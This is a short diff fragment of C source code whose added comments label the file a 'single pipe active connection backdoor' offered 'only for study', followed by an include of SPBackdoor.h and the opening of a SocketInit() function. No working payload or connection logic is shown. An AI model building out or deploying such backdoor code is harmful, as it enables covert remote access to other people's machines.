@@ -1,3 +1,6 @@
+//SINGLE PIPE ACTIVE CONNECTION BACKDOOR
+//ONLY FOR STUDY
+
 #include "SPBackdoor.h"
 
 BOOL SocketInit()
